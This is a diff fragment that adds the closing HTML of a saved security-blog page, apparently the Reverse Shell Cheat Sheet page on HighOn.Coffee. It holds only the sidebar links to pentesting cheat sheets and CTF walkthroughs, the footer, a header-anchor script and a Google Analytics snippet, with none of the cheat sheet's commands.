+<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">Penetration Testing Tools Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/vi-cheat-sheet/">Vi Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</a>
+</li>
+<li class="current">
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/nmap-cheat-sheet/">Nmap Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/cheat-sheet/">More »</a>
+</li>
+</ul>
+<h4>WalkThroughs</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/walkthroughs/">More »</a>
+</li>
+</ul>
+<h4>Techniques</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/">SSH &amp; Meterpreter Pivoting Techniques</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/techniques/">More »</a>
+</li>
+</ul>
+<h4>Security Hardening</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/security-harden-centos-7/">Security Harden CentOS 7</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/security-hardening/">More »</a>
+</li>
+</ul>
+<h4>/dev/urandom</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li>
+<a href="https://highon.coffee/blog/urandom/">More »</a>
+</li>
+</ul>
+<h4>Other Blog</h4>
+<ul>
+<li class="">
+<a href="https://highon.coffee/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/howto-install-quassel-ubuntu/">HowTo Install Quassel on Ubuntu</a>
+</li>
+<li class="">
+<a href="https://highon.coffee/blog/keepnote-macbook-install-instructions/">HowTo Install KeepNote on OSX Mavericks</a>
+</li>
+</ul>
+</aside>
+</div>
+<div class="clear"></div>
+</div>
+</section>
+<footer>
+<div class="grid">
+<div class="unit one-third center-on-mobiles">
+<p>The contents of this website are ©&nbsp;2017 <a href="http://highon.coffee/">HighOn.Coffee</a></p>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>
+Proudly hosted by
+<img src="./Reverse Shell Cheat Sheet_files/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
+
+</p>
+</div>
+</div>
+</footer>
+<script data-cfasync="false" src="./Reverse Shell Cheat Sheet_files/email-decode.min.js"></script><script type="text/rocketscript" data-rocketoptimized="true">
+  var anchorForId = function (id) {
+    var anchor = document.createElement("a");
+    anchor.className = "header-link";
+    anchor.href      = "#" + id;
+    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
+    return anchor;
+  };
+
+  var linkifyAnchors = function (level, containingElement) {
+    var headers = containingElement.getElementsByTagName("h" + level);
+    for (var h = 0; h < headers.length; h++) {
+      var header = headers[h];
+
+      if (typeof header.id !== "undefined" && header.id !== "") {
+        header.appendChild(anchorForId(header.id));
+      }
+    }
+  };
+
+  document.onreadystatechange = function () {
+    if (this.readyState === "complete") {
+      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
+      if (!contentBlock) {
+        return;
+      }
+      for (var level = 1; level <= 6; level++) {
+        linkifyAnchors(level, contentBlock);
+      }
+    }
+  };
+</script>
+<script type="text/rocketscript" data-rocketoptimized="true">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-55017594-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+</body></html>
